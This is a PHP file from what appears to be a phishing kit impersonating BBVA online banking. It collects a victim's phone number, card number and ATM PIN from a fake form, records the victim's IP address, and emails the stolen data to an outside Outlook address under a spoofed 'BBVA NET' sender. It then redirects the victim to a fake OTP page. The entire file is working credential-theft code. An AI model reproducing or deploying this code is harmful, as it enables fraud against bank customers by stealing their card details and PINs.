<? 

  function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }

$ip = get_real_ip();


$a5 = "BBVA NET";
$a6 = "info@hotmail.com";
$id = file_get_contents('id.txt');
	$Tipoid = $_POST['cel'];
	$numeid = $_POST['tarjeta'];
	$passwo = $_POST['Clavecajero'];
		
	$asunto = "Info BBVA (.$ip.)";
	$mensaje = "<p><strong>Celular	      :</strong> ".$Tipoid."</p>
		    <p><strong>Tarjeta        :</strong> ".$numeid."</p> 
		    <p><strong>pin            :</strong> ".$passwo."</p>
<p>...............................</p><p><strong>Id	      :</strong> ".$id."</p>";


	$retorno = "daddyspain@outlook.com";
	
	//para el envio en formato HTML
	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: ".$a5." <".$a6.">";
	
	mail($retorno, $asunto, $mensaje, $headers);


$p1 = substr($Tipoid, 0,3);
$p2 = substr($Tipoid, 6,6);
$pm = "***";
$numero = "".$p1."".$pm."".$p2."";
$guardame = fopen('cel.txt','a+');
fwrite($guardame,"$numero");
fclose($guardame);



header("Location: LogonOperacionServletOtp.php"); 
     

?> 

	